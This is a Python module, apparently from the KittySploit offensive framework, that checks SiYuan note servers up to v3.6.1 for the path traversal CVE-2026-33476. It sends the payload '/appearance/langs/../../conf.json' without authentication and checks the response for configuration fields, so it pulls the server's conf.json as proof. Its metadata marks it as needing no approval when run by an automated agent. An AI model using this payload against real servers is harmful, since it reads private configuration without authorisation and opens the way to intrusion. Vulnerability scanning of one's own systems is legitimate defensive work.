#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SiYuan <= v3.6.1 - Path Traversal"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "SiYuan <= v3.6.1 - Path Traversal",
        "description": "Unauthenticated path traversal via /appearance/*filepath reads conf.json.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-33476",
        "tags": ["web", "scanner", "cve", "cve2026", "vuln", "siyuan", "lfi", "traversal"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-hhgj-gg9h-rjp7",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-33476",
        ],
    }

    def run(self):
        path = "/appearance/langs/../../conf.json"
        r = self.http_request(method="GET", path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if not all(m in body for m in ('"kernelVersion"', '"logLevel"')):
            return False
        self.set_info(
            severity="high",
            cve="CVE-2026-33476",
            reason="SiYuan /appearance path traversal exposed conf.json",
            path=path,
            confidence="high",
        )
        return True
